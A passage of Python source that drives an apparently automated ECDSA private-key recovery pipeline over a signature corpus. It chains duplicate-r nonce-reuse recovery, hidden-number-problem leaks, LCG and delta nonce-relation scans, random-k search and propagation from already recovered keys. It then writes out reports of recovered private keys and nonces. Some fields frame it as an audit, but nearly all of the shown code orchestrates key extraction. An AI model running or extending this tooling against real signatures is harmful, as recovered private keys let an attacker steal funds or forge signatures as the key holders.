            post_validation = post_validate_recovered(Path(args.recover_json_out))
        return known_k_chain_report

    def maybe_run_known_priv_chain(trigger_stage: str) -> dict[str, Any] | None:
        nonlocal known_priv_chain_report, last_known_priv_fingerprint, last_known_priv_rows, post_validation
        if not args.enable_chain_extraction:
            return known_priv_chain_report
        before_priv_rows = last_known_priv_rows
        before_k_rows = count_nonempty_lines(Path(args.recover_k_out))
        current_priv_rows = count_nonempty_lines(Path(args.recover_json_out))
        current_fingerprint = artifact_fingerprint(Path(args.recover_json_out))
        if current_fingerprint == last_known_priv_fingerprint:
            return known_priv_chain_report
        previous_fingerprint = last_known_priv_fingerprint
        last_known_priv_fingerprint = current_fingerprint
        last_known_priv_rows = current_priv_rows
        known_priv_chain_report = derive_recovered_k_from_known_privs(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            report_path=Path(args.known_priv_chain_report),
            max_rows=max(0, int(args.known_priv_chain_max_rows)),
        )
        full_corpus_report: dict[str, Any] | None = None
        full_corpus_path = Path(args.known_k_full_corpus_sigs) if args.known_k_full_corpus_sigs else None
        if full_corpus_path and full_corpus_path.exists():
            try:
                if full_corpus_path.resolve() != sigs.resolve():
                    full_report_path = Path(args.known_priv_chain_report).with_name(
                        Path(args.known_priv_chain_report).stem + "_full_corpus.json"
                    )
                    full_corpus_report = derive_recovered_k_from_known_privs(
                        sig_path=full_corpus_path,
                        recovered_json_path=Path(args.recover_json_out),
                        recovered_k_path=Path(args.recover_k_out),
                        report_path=full_report_path,
                        max_rows=max(0, int(args.known_k_full_corpus_max_rows)),
                    )
                    known_priv_chain_report["full_corpus"] = {
                        "enabled": True,
                        "input": str(full_corpus_path),
                        "report": str(full_report_path),
                        "rows_matching_recovered_pubkey": int(full_corpus_report.get("rows_matching_recovered_pubkey", 0) or 0),
                        "new_k_candidates": int(full_corpus_report.get("new_k_candidates", 0) or 0),
                        "new_r_groups": int(full_corpus_report.get("new_r_groups", 0) or 0),
                    }
                else:
                    known_priv_chain_report["full_corpus"] = {
                        "enabled": False,
                        "reason": "same_as_active_input",
                        "input": str(full_corpus_path),
                    }
            except Exception as e:
                known_priv_chain_report["full_corpus"] = {
                    "enabled": True,
                    "error": str(e),
                    "input": str(full_corpus_path),
                }
                print(f"[warn] full-corpus known-priv propagation failed: {e}")
        elif args.known_k_full_corpus_sigs:
            known_priv_chain_report["full_corpus"] = {
                "enabled": False,
                "reason": "input_missing",
                "input": str(args.known_k_full_corpus_sigs),
            }
        after_k_rows = count_nonempty_lines(Path(args.recover_k_out))
        active_new_k = int(known_priv_chain_report.get("new_k_candidates", 0) or 0)
        full_new_k = int(full_corpus_report.get("new_k_candidates", 0) or 0) if full_corpus_report else 0
        run_summary = {
            "name": "known-priv-chain",
            "trigger": trigger_stage,
            "rc": 0,
            "recovered_priv_rows_before": before_priv_rows,
            "recovered_priv_rows_after": current_priv_rows,
            "recovered_priv_changed": True,
            "recovered_k_rows_before": before_k_rows,
            "recovered_k_rows_after": after_k_rows,
            "previous_recovered_priv_fingerprint": previous_fingerprint[:16],
            "current_recovered_priv_fingerprint": current_fingerprint[:16],
            "new_k_candidates": active_new_k + full_new_k,
            "active_input_new_k_candidates": active_new_k,
            "full_corpus_new_k_candidates": full_new_k,
            "rows_matching_recovered_pubkey": int(known_priv_chain_report.get("rows_matching_recovered_pubkey", 0) or 0),
            "full_corpus_rows_matching_recovered_pubkey": (
                int(full_corpus_report.get("rows_matching_recovered_pubkey", 0) or 0)
                if full_corpus_report else 0
            ),
        }
        known_priv_chain_history.append(run_summary)
        known_priv_chain_report["trigger"] = trigger_stage
        known_priv_chain_report["history"] = known_priv_chain_history
        known_priv_chain_report["last_run_new_k_candidates"] = active_new_k + full_new_k
        known_priv_chain_report["last_run_active_input_new_k_candidates"] = active_new_k
        known_priv_chain_report["last_run_full_corpus_new_k_candidates"] = full_new_k
        known_priv_chain_report["cumulative_new_k_candidates"] = sum(
            int(x.get("new_k_candidates", 0) or 0) for x in known_priv_chain_history
        )
        known_priv_chain_report["cumulative_active_input_new_k_candidates"] = sum(
            int(x.get("active_input_new_k_candidates", 0) or 0) for x in known_priv_chain_history
        )
        known_priv_chain_report["cumulative_full_corpus_new_k_candidates"] = sum(
            int(x.get("full_corpus_new_k_candidates", 0) or 0) for x in known_priv_chain_history
        )
        known_priv_chain_report["cumulative_rows_matching_recovered_pubkey"] = sum(
            int(x.get("rows_matching_recovered_pubkey", 0) or 0) for x in known_priv_chain_history
        )
        Path(args.known_priv_chain_report).write_text(json.dumps(known_priv_chain_report, indent=2), encoding="utf-8")
        stage_runs.append(run_summary)
        print(
            "Known-priv chain propagation:",
            f"trigger={trigger_stage}",
            f"new_k_candidates={active_new_k + full_new_k}",
            f"rows_matching_pubkey={known_priv_chain_report.get('rows_matching_recovered_pubkey', 0)}",
            f"full_corpus_rows_matching_pubkey={full_corpus_report.get('rows_matching_recovered_pubkey', 0) if full_corpus_report else 0}",
            f"report={args.known_priv_chain_report}",
        )
        post_validation = post_validate_recovered(Path(args.recover_json_out))
        return known_priv_chain_report

    def run_chain_propagation(trigger_stage: str, max_rounds: int = 3) -> None:
        for round_idx in range(max(1, int(max_rounds))):
            before_k = artifact_fingerprint(Path(args.recover_k_out))
            before_priv = artifact_fingerprint(Path(args.recover_json_out))
            maybe_run_known_k_chain(f"{trigger_stage}:round{round_idx + 1}:known-k")
            maybe_run_known_priv_chain(f"{trigger_stage}:round{round_idx + 1}:known-priv")
            after_k = artifact_fingerprint(Path(args.recover_k_out))
            after_priv = artifact_fingerprint(Path(args.recover_json_out))
            if before_k == after_k and before_priv == after_priv:
                break

    strong_signal = (
        risk >= max(args.risk_threshold, 80)
        or cross_pub_dup_r > 0
        or dup_r > 0
        or drift_flags > 0
        or sighash_anomaly
        or signer_drift_flagged > 0
    )
    known_nonce_rows = known_nonce_rows_all
    recovery_viability = recovery_viability_label(
        stage0_subset_info=stage0_subset_info,
        known_nonce_rows=known_nonce_rows,
        min_hnp_leaks=args.hnp_min_leaks,
        dup_r=dup_r,
        cross_pub_dup_r=cross_pub_dup_r,
        strong_signal=strong_signal,
        external_candidate_requested=candidate_evidence_available,
    )
    stage1_threads = args.threads
    stage1_iter = max(1, args.max_iter)
    if low_quality_data and not args.exhaustive_recover:
        stage1_threads = max(1, min(args.threads, 4))
        stage1_iter = 1

    # Direct duplicate-r recovery is algebraically stronger than cluster heuristics.
    # Run it on the full duplicate-r focus subset before any broader clustered stage,
    # because cluster gating can legitimately omit the exact same-r/different-s rows.
    if (
        stage0_subset_info
        and int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0) or 0) > 0
        and int(stage0_subset_info.get("selected_signatures_recoverable_focus", 0) or 0) > 0
    ):
        stage0_extra = ["--no-lcg", "--scan-random-k", "0", "--min-count", "1"] + external_candidate_args
        stage0_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=str(stage0_recoverable_path),
            threads=stage1_threads,
            max_iter=1,
            stage_name="stage0-dup-r-direct",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=stage0_extra,
        )
        stage_runs.append({"name": "stage0-dup-r-direct", "rc": stage0_rc})
        if stage0_rc != 0:
            raise RuntimeError(f"Recover stage0 duplicate-r failed with exit code {stage0_rc}")
        run_chain_propagation("stage0-dup-r-direct")
        stage0_post_validation = post_validate_recovered(Path(args.recover_json_out))
        stage0_new_valid_rows = (
            int(stage0_post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
        )
        stage0_pre_valid_rows = int(pre_recover_validation.get("valid_rows", 0))
        stage0_post_valid_rows = int(stage0_post_validation.get("valid_rows", 0))
        if args.stage0_only or (args.stop_after_stage0_hit and stage0_new_valid_rows > 0):
            write_candidate_validation_report(
                Path(args.candidate_validation_report),
                external_candidate_report,
                pre_recover_validation,
                stage0_post_validation,
            )
            stage0_material_summary = recovery_material_summary(
                external_candidate_report,
                pre_recover_validation,
                stage0_post_validation,
            )
            stop_reason = "stage0_only" if args.stage0_only else "stage0_hit"
            print(
                "Recovery automation stopped after Stage0.",
                f"reason={stop_reason}",
                f"new_valid_rows={stage0_material_summary['new_local_recovered_rows']}",
            )
            write_decision(args.decision_out, {
                "should_recover": True,
                "recover_executed": True,
                "search_attempted": True,
                "stopped_after_stage0": True,
                "stage0_stop_reason": stop_reason,
                "recovery_viability": recovery_viability,
                "known_nonce_rows": known_nonce_rows,
                "external_candidate_requested": external_candidate_requested,
                "candidate_evidence_available": candidate_evidence_available,
                "exhaustive_recover": args.exhaustive_recover,
                "hnp_candidate_rows": len(hnp_candidates or []),
                "external_candidate_validation": external_candidate_report,
                "key_recovered": stage0_material_summary["key_recovered"],
                "new_key_recovered": stage0_material_summary["new_key_recovered"],
                "valid_recovered_material_present": stage0_material_summary["valid_recovered_material_present"],
                "recovery_outcome": stage0_material_summary["recovery_outcome"],
                "no_new_key_reason": stage0_material_summary["no_new_key_reason"],
                "new_local_recovered_rows": stage0_material_summary["new_local_recovered_rows"],
                "key_material_present": stage0_material_summary["key_material_present"],
                "pre_existing_valid_recovered_rows": stage0_material_summary["pre_existing_valid_recovered_rows"],
                "preloaded_valid_recovered_rows": stage0_material_summary["preloaded_valid_recovered_rows"],
                "cycle_valid_recovered_rows": stage0_material_summary["cycle_valid_recovered_rows"],
                "total_valid_recovered_rows": stage0_material_summary["total_valid_recovered_rows"],
                "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
                "risk_score": risk,
                "risk_verdict": verdict,
                "duplicate_r": dup_r,
                "cross_pub_duplicate_r": cross_pub_dup_r,
                "drift_flags": drift_flags,
                "sighash_anomaly": sighash_anomaly,
                "signal_fusion_tier": fusion_tier,
                "signal_fusion_confidence": fusion_conf,
                "signal_fusion_recommendation": fusion_reco,
                "verification_quality": vq,
                "low_quality_data": low_quality_data,
                "cluster_fallback_used": cluster_fallback_used,
                "sqlite_index": sqlite_index_report,
                "target_filter": target_filter_info,
                "source_sigs": str(original_sigs),
                "effective_cluster_risk_threshold": effective_cluster_threshold,
                "recover_input": str(stage0_recoverable_path),
                "cluster_gating_used": not args.disable_cluster_gating,
                "recover_stages": stage_runs,
                "stage0_subset": stage0_subset_info,
                "known_k_chain_report": known_k_chain_report,
                "known_priv_chain_report": known_priv_chain_report,
                "post_recover_validation": stage0_post_validation,
            })
            try:
                Path(args.baseline_report).write_text(
                    Path(args.audit_report).read_text(encoding="utf-8"),
                    encoding="utf-8",
                )
            except Exception:
                pass
            return

    if args.enable_unresolved_targets:
        unresolved_targets_report = build_unresolved_recovery_targets_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.unresolved_targets_out),
            report_path=Path(args.unresolved_targets_report),
        )

    stage1_skip_report = should_skip_stage1_when_resolved(
        stage0_subset_info=stage0_subset_info,
        unresolved_targets_report=unresolved_targets_report,
        hnp_leak_report=hnp_leak_report,
        candidate_evidence_available=broad_relation_candidate_evidence_available,
        exhaustive_recover=bool(args.exhaustive_recover),
        skip_when_resolved_enabled=bool(args.skip_broad_relation_when_resolved),
    )
    stage1_ran = False
    if stage1_skip_report.get("skip"):
        stage_runs.append({"name": "stage1-primary-skip", "rc": 0, **stage1_skip_report})
        print(
            "Skipping Stage1 primary recovery:",
            f"reason={','.join(stage1_skip_report.get('reasons', []))}",
            f"selected_unresolved_rows={stage1_skip_report.get('selected_unresolved_rows', 0)}",
        )
    else:
        stage1_extra = ["--no-lcg", "--scan-random-k", "0"] + external_candidate_args
        if dup_r > 0:
            stage1_extra += ["--min-count", "1"]
        stage1_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=recover_input,
            threads=stage1_threads,
            max_iter=stage1_iter,
            stage_name="stage1-primary",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=stage1_extra,
        )
        stage1_ran = True
        stage_runs.append({"name": "stage1-primary", "rc": stage1_rc})
        if stage1_rc != 0:
            raise RuntimeError(f"Recover stage1 failed with exit code {stage1_rc}")
        run_chain_propagation("stage1-primary")

    relation_subset_report: dict[str, Any] | None = None
    broad_relation_skip_report: dict[str, Any] = {"skip": False, "reasons": []}
    relation_input = recover_input
    relation_source_path = sigs
    if args.enable_unresolved_targets and (unresolved_targets_report is None or stage1_ran):
        unresolved_targets_report = build_unresolved_recovery_targets_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.unresolved_targets_out),
            report_path=Path(args.unresolved_targets_report),
        )
        if int(unresolved_targets_report.get("selected_rows", 0) or 0) >= 2:
            relation_input = args.unresolved_targets_out
            relation_source_path = Path(args.unresolved_targets_out)
            print(
                "Unresolved recovery targets:",
                f"selected_rows={unresolved_targets_report.get('selected_rows', 0)}",
                f"unresolved_groups={unresolved_targets_report.get('unresolved_duplicate_r_groups', 0)}",
                f"report={args.unresolved_targets_report}",
            )
        else:
            print(
                "Unresolved recovery targets empty; using existing recovery input.",
                f"report={args.unresolved_targets_report}",
            )
    broad_relation_skip_report = should_skip_broad_relation_recovery(
        unresolved_targets_report=unresolved_targets_report,
        hnp_leak_report=hnp_leak_report,
        candidate_evidence_available=broad_relation_candidate_evidence_available,
        exhaustive_recover=bool(args.exhaustive_recover),
        skip_when_resolved_enabled=bool(args.skip_broad_relation_when_resolved),
    )
    broad_relation_skip_report["candidate_evidence_available_overall"] = bool(candidate_evidence_available)
    broad_relation_skip_report["local_recovery_store_preload_only"] = bool(
        candidate_evidence_available and not broad_relation_candidate_evidence_available
    )
    broad_relation_skip_report["explicit_preload_k_evidence"] = explicit_preload_k_evidence
    broad_relation_skip_report["explicit_preload_priv_evidence"] = explicit_preload_priv_evidence
    if broad_relation_skip_report.get("skip"):
        stage_runs.append({"name": "broad-relation-skip", "rc": 0, **broad_relation_skip_report})
        print(
            "Skipping broad relation recovery:",
            f"reason={','.join(broad_relation_skip_report.get('reasons', []))}",
            f"selected_unresolved_rows={broad_relation_skip_report.get('selected_unresolved_rows', 0)}",
        )
        if allow_advanced and strong_signal and args.enable_suspicious_signer_relation:
            relation_subset_report = build_signer_relation_neighborhood_subset(
                sig_path=sigs,
                recovered_json_path=Path(args.recover_json_out),
                recovered_k_path=Path(args.recover_k_out),
                audit_report=report,
                out_path=Path(args.relation_neighborhood_out),
                report_path=Path(args.relation_neighborhood_report),
                min_sigs=args.relation_min_sigs,
                max_signers=args.relation_max_signers,
                max_rows_per_signer=args.relation_max_rows_per_signer,
                max_pairs_per_signer=args.relation_max_pairs_per_signer,
                neighbor_window=args.relation_neighbor_window,
            )
            if (
                int(relation_subset_report.get("selected_rows", 0) or 0) >= 2
                and int(relation_subset_report.get("audit_flagged_selected", 0) or 0) > 0
            ):
                relation_input = args.relation_neighborhood_out
                print(
                    "Suspicious signer relation fallback:",
                    f"selected_rows={relation_subset_report.get('selected_rows', 0)}",
                    f"selected_signers={relation_subset_report.get('selected_signers', 0)}",
                    f"audit_flagged_selected={relation_subset_report.get('audit_flagged_selected', 0)}",
                )
                suspect_rc = run_recover_stage(
                    recover_bin=args.recover_bin,
                    recover_input=relation_input,
                    threads=min(max(2, args.threads), 8),
                    max_iter=max(1, min(args.max_iter, 2)),
                    stage_name="stage2-suspicious-signer-relation",
                    recover_json_out=args.recover_json_out,
                    recover_txt_out=args.recover_txt_out,
                    recover_k_out=args.recover_k_out,
                    recover_deltas_out=args.recover_deltas_out,
                    recover_collisions_out=args.recover_collisions_out,
                    recover_clusters_out=args.recover_clusters_out,
                    extra_args=["--scan-random-k", "0"] + structured_relation_args(args) + external_candidate_args,
                )
                stage_runs.append({"name": "stage2-suspicious-signer-relation", "rc": suspect_rc, "input": relation_input})
                if suspect_rc != 0:
                    raise RuntimeError(f"Recover suspicious-signer relation stage failed with exit code {suspect_rc}")
                run_chain_propagation("stage2-suspicious-signer-relation")
            else:
                print(
                    "Suspicious signer relation fallback empty:",
                    f"selected_rows={relation_subset_report.get('selected_rows', 0)}",
                    f"audit_flagged_selected={relation_subset_report.get('audit_flagged_selected', 0)}",
                )
    if allow_advanced and strong_signal and not broad_relation_skip_report.get("skip"):
        relation_subset_report = build_signer_relation_neighborhood_subset(
            sig_path=relation_source_path,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            audit_report=report,
            out_path=Path(args.relation_neighborhood_out),
            report_path=Path(args.relation_neighborhood_report),
            min_sigs=args.relation_min_sigs,
            max_signers=args.relation_max_signers,
            max_rows_per_signer=args.relation_max_rows_per_signer,
            max_pairs_per_signer=args.relation_max_pairs_per_signer,
            neighbor_window=args.relation_neighbor_window,
        )
        if int(relation_subset_report.get("selected_rows", 0) or 0) >= 2:
            relation_input = args.relation_neighborhood_out
            print(
                "Relation neighborhood focus:",
                f"selected_rows={relation_subset_report.get('selected_rows', 0)}",
                f"selected_signers={relation_subset_report.get('selected_signers', 0)}",
            )
        else:
            print("Relation neighborhood focus is empty; using primary recovery input for relation scans.")

    if allow_advanced and strong_signal and not broad_relation_skip_report.get("skip"):
        if low_quality_data and not args.exhaustive_recover:
            # Constrained advanced pass for low-quality datasets:
            # keep compute bounded but still allow deeper search than stage1-only.
            stage2_threads = min(max(2, args.threads), 4)
            stage2_iter = 1
        else:
            stage2_threads = min(max(2, args.threads), 16)
            stage2_iter = max(args.max_iter, 2)
            if fusion_tier == "critical":
                stage2_iter = max(stage2_iter, 3)
        stage2_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=relation_input,
            threads=stage2_threads,
            max_iter=stage2_iter,
            stage_name="stage2-lcg-delta",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=["--scan-random-k", "0"] + structured_relation_args(args) + external_candidate_args,
        )
        stage_runs.append({"name": "stage2-lcg-delta", "rc": stage2_rc, "input": relation_input})
        if stage2_rc != 0:
            raise RuntimeError(f"Recover stage2 failed with exit code {stage2_rc}")
        run_chain_propagation("stage2-lcg-delta")

        if (
            args.random_k_budget > 0
            and (
                args.exhaustive_recover
                or (
                    not low_quality_data
                    and (cross_pub_dup_r > 0 or drift_flags > 0 or risk >= 120)
                )
            )
        ):
            stage3_input = recover_input
            strong_subset = Path(args.strong_signal_out)
            selected = build_strong_signal_subset_from_cluster_report(
                sig_path=Path(relation_input),
                cluster_report_path=Path(args.cluster_report),
                out_path=strong_subset,
            )
            if selected > 0:
                stage3_input = str(strong_subset)
            stage3_rc = run_recover_stage(
                recover_bin=args.recover_bin,
                recover_input=stage3_input,
                threads=min(max(2, args.threads), 16),
                max_iter=max(args.max_iter, 3 if fusion_tier == "critical" else 2),
                stage_name="stage3-random-k",
                recover_json_out=args.recover_json_out,
                recover_txt_out=args.recover_txt_out,
                recover_k_out=args.recover_k_out,
                recover_deltas_out=args.recover_deltas_out,
                recover_collisions_out=args.recover_collisions_out,
                recover_clusters_out=args.recover_clusters_out,
                extra_args=[
                    "--scan-random-k", str(args.random_k_budget),
                ] + structured_relation_args(args) + external_candidate_args,
            )
            stage_runs.append({"name": "stage3-random-k", "rc": stage3_rc})
            if stage3_rc != 0:
                raise RuntimeError(f"Recover stage3 failed with exit code {stage3_rc}")
            run_chain_propagation("stage3-random-k")

    post_validation = post_validate_recovered(Path(args.recover_json_out))
    new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
    if (
        args.full_scan_fallback
        and recover_input != str(sigs)
        and (strong_signal or args.exhaustive_recover)
        and not broad_relation_skip_report.get("skip")
        and (args.exhaustive_recover or post_validation["valid_rows"] <= pre_recover_validation["valid_rows"])
    ):
        if args.exhaustive_recover:
            print("Exhaustive recovery enabled; running full-input fallback even after filtered-stage hits.")
        else:
            print("Filtered recovery yielded no new valid rows; escalating to full-input fallback.")
        fallback_iter = max(args.max_iter, args.fallback_max_iter)
        fallback_threads = min(max(2, args.threads), 16)
        if fusion_tier == "critical":
            fallback_iter = max(fallback_iter, 4)
        fallback_relation_input = relation_input
        if relation_subset_report is not None and int(relation_subset_report.get("selected_rows", 0) or 0) < 2:
            fallback_relation_input = str(sigs)
        fallback_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=fallback_relation_input,
            threads=fallback_threads,
            max_iter=fallback_iter,
            stage_name="fallback-full-lcg-delta",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=structured_relation_args(args) + external_candidate_args,
        )
        stage_runs.append({"name": "fallback-full-lcg-delta", "rc": fallback_rc, "input": fallback_relation_input})
        if fallback_rc != 0:
            raise RuntimeError(f"Recover full-input fallback failed with exit code {fallback_rc}")
        run_chain_propagation("fallback-full-lcg-delta")

        fallback_random_budget = max(0, int(args.fallback_random_k_budget))
        if fallback_random_budget > 0:
            fallback_random_input = ""
            strong_subset = Path(args.strong_signal_out)
            strong_subset_source = (
                Path(recover_input)
                if recover_input != str(sigs) and Path(recover_input).exists()
                else sigs
            )
            selected = build_strong_signal_subset_from_cluster_report(
                sig_path=strong_subset_source,
                cluster_report_path=Path(args.cluster_report),
                out_path=strong_subset,
            )
            if selected > 0:
                fallback_random_input = str(strong_subset)
                print(
                    "Random-k fallback constrained to strong-signal subset:",
                    f"selected_signatures={selected}",
                )
            elif recover_input != str(sigs) and Path(recover_input).exists():
                fallback_random_input = recover_input
                print("Random-k fallback constrained to filtered recovery input.")

            if fallback_random_input:
                fallback_random_rc = run_recover_stage(
                    recover_bin=args.recover_bin,
                    recover_input=fallback_random_input,
                    threads=fallback_threads,
                    max_iter=max(fallback_iter, 4 if fusion_tier == "critical" else 3),
                    stage_name="fallback-targeted-random-k",
                    recover_json_out=args.recover_json_out,
                    recover_txt_out=args.recover_txt_out,
                    recover_k_out=args.recover_k_out,
                    recover_deltas_out=args.recover_deltas_out,
                    recover_collisions_out=args.recover_collisions_out,
                    recover_clusters_out=args.recover_clusters_out,
                    extra_args=[
                        "--scan-random-k", str(fallback_random_budget),
                    ] + structured_relation_args(args) + external_candidate_args,
                )
                stage_runs.append(
                    {
                        "name": "fallback-targeted-random-k",
                        "rc": fallback_random_rc,
                        "input": fallback_random_input,
                    }
                )
                if fallback_random_rc != 0:
                    raise RuntimeError(
                        f"Recover targeted random-k fallback failed with exit code {fallback_random_rc}"
                    )
                run_chain_propagation("fallback-targeted-random-k")
            else:
                print(
                    "Skipping random-k fallback: no targeted subset available; "
                    "full-corpus random-k is not cost-effective."
                )
                stage_runs.append(
                    {
                        "name": "fallback-targeted-random-k",
                        "rc": None,
                        "skipped": True,
                        "reason": "no_targeted_input",
                    }
                )
        post_validation = post_validate_recovered(Path(args.recover_json_out))
        new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])

    chain_report: dict[str, Any] | None = None
    if args.enable_chain_extraction and int(post_validation.get("valid_rows", 0) or 0) > 0:
        chain_pre_validation = post_validation
        graph_report = build_recovery_graph_focus_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_graph_subset_out),
            report_path=Path(args.recovery_graph_report),
        )
        chain_input = str(sigs)
        if int(graph_report.get("selected_rows", 0) or 0) > 0:
            chain_input = str(Path(args.recovery_graph_subset_out))
            print(
                "Recovery graph focus:",
                f"selected_rows={graph_report.get('selected_rows', 0)}",
                f"known_pubkeys={graph_report.get('known_recovered_pubkeys', 0)}",
                f"known_r={graph_report.get('known_recovered_r', 0)}",
            )
        else:
            print("Recovery graph focus is empty; falling back to full-input chain extraction.")
        chain_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=chain_input,
            threads=min(max(2, args.threads), 16),
            max_iter=max(1, int(args.chain_max_iter)),
            stage_name="stage-chain-extract-graph",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=["--no-lcg", "--scan-random-k", "0", "--min-count", "1"],
        )
        stage_runs.append({"name": "stage-chain-extract-graph", "rc": chain_rc, "input": chain_input})
        if chain_rc != 0:
            raise RuntimeError(f"Recover chain extraction failed with exit code {chain_rc}")
        run_chain_propagation("stage-chain-extract-graph")
        post_validation = post_validate_recovered(Path(args.recover_json_out))
        new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
        chain_report = build_recovery_chain_report(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_chain_report),
        )
        chain_report["new_valid_rows_from_chain_stage"] = max(
            0,
            int(post_validation.get("valid_rows", 0) or 0)
            - int(chain_pre_validation.get("valid_rows", 0) or 0),
        )
        chain_report["recovery_graph_focus"] = graph_report
        chain_report["recovery_graph_expansion"] = build_recovery_graph_expansion_report(
            graph_subset_path=Path(args.recovery_graph_subset_out),
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            pre_validation=chain_pre_validation,
            post_validation=post_validation,
            out_path=Path(args.recovery_graph_expansion_report),
        )
    elif args.enable_chain_extraction:
        graph_report = build_recovery_graph_focus_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_graph_subset_out),
            report_path=Path(args.recovery_graph_report),
        )
        chain_report = build_recovery_chain_report(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_chain_report),
        )
        chain_report["skipped_chain_stage"] = "no_valid_recovered_keys"
        chain_report["recovery_graph_focus"] = graph_report
        chain_report["recovery_graph_expansion"] = build_recovery_graph_expansion_report(
            graph_subset_path=Path(args.recovery_graph_subset_out),
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            pre_validation=post_validation,
            post_validation=post_validation,
            out_path=Path(args.recovery_graph_expansion_report),
        )

    pre_valid_rows = int(pre_recover_validation.get("valid_rows", 0))
    post_valid_rows = int(post_validation.get("valid_rows", 0))
    material_summary = recovery_material_summary(
        external_candidate_report,
        pre_recover_validation,
        post_validation,
    )

    write_candidate_validation_report(
        Path(args.candidate_validation_report),
        external_candidate_report,
        pre_recover_validation,
        post_validation,
    )

    print(f"Recovery automation complete. input={recover_input}")
    write_decision(args.decision_out, {
        "should_recover": True,
        "recover_executed": True,
        "search_attempted": True,
        "recovery_viability": recovery_viability,
        "known_nonce_rows": known_nonce_rows,
        "external_candidate_requested": external_candidate_requested,
        "candidate_evidence_available": candidate_evidence_available,
        "broad_relation_candidate_evidence_available": broad_relation_candidate_evidence_available,
        "exhaustive_recover": args.exhaustive_recover,
        "hnp_candidate_rows": len(hnp_candidates or []),
        "external_candidate_validation": external_candidate_report,
        "key_recovered": material_summary["key_recovered"],
        "new_key_recovered": material_summary["new_key_recovered"],
        "valid_recovered_material_present": material_summary["valid_recovered_material_present"],
        "recovery_outcome": material_summary["recovery_outcome"],
        "no_new_key_reason": material_summary["no_new_key_reason"],
        "new_local_recovered_rows": material_summary["new_local_recovered_rows"],
        "key_material_present": material_summary["key_material_present"],
        "pre_existing_valid_recovered_rows": material_summary["pre_existing_valid_recovered_rows"],
        "preloaded_valid_recovered_rows": material_summary["preloaded_valid_recovered_rows"],
        "cycle_valid_recovered_rows": material_summary["cycle_valid_recovered_rows"],
        "total_valid_recovered_rows": material_summary["total_valid_recovered_rows"],
        "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
        "risk_score": risk,
        "risk_verdict": verdict,
        "duplicate_r": dup_r,
        "cross_pub_duplicate_r": cross_pub_dup_r,
        "drift_flags": drift_flags,
        "sighash_anomaly": sighash_anomaly,
        "signal_fusion_tier": fusion_tier,
        "signal_fusion_confidence": fusion_conf,
        "signal_fusion_recommendation": fusion_reco,
        "verification_quality": vq,
        "low_quality_data": low_quality_data,
        "cluster_fallback_used": cluster_fallback_used,
        "sqlite_index": sqlite_index_report,
        "target_filter": target_filter_info,
        "source_sigs": str(original_sigs),
        "effective_cluster_risk_threshold": effective_cluster_threshold,
        "recover_input": recover_input,
        "cluster_gating_used": not args.disable_cluster_gating,
        "recover_stages": stage_runs,
        "stage0_subset": stage0_subset_info,
        "hnp_leak_report": hnp_leak_report,
        "hnp_bounded_k_report": hnp_bounded_k_report,
        "unresolved_targets_report": unresolved_targets_report,
        "stage1_skip_report": stage1_skip_report,
        "broad_relation_skip_report": broad_relation_skip_report,
        "relation_neighborhood_report": relation_subset_report,
        "known_k_chain_report": known_k_chain_report,
        "known_priv_chain_report": known_priv_chain_report,
        "recovery_chain_report": chain_report,
        "post_recover_validation": post_validation,
    })
    try:
        Path(args.baseline_report).write_text(Path(args.audit_report).read_text(encoding="utf-8"), encoding="utf-8")
    except Exception:
        pass


if __name__ == "__main__":
    main()
